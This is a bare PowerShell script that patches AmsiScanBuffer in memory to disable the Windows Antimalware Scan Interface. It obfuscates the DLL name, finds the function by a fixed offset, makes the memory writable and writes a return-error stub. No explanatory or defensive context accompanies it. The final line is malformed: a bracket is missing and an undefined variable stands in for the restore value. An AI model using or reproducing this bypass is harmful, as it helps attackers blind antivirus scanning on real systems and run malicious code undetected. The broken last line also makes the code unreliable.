$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

# Load amsi.dll
$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")

# Get address of DllGetClassObject function within amsi.dll
$DllGetClassObjectAddress = [Win32]::GetProcAddress($LoadLibrary, "DllGetClassObject")

# Calculate address of AmsiScanBuffer relatively (DllGetClassObject + Offset)
$ASBAddress = [System.IntPtr]::New($DllGetClassObjectAddress.ToInt64() + [Int64](7216))
$oldProtect = 0
[Win32]::VirtualProtect($ASBAddress, [uint32]5, 0x40, [ref]$oldProtect) | Out-null
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
$newProtect = 0

# Patch AmsiScanBuffer
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $ASBAddress, 6)
Win32]::VirtualProtect($ASBAddress, [uint32]5, $x, [ref]$newProtect) | Out-null
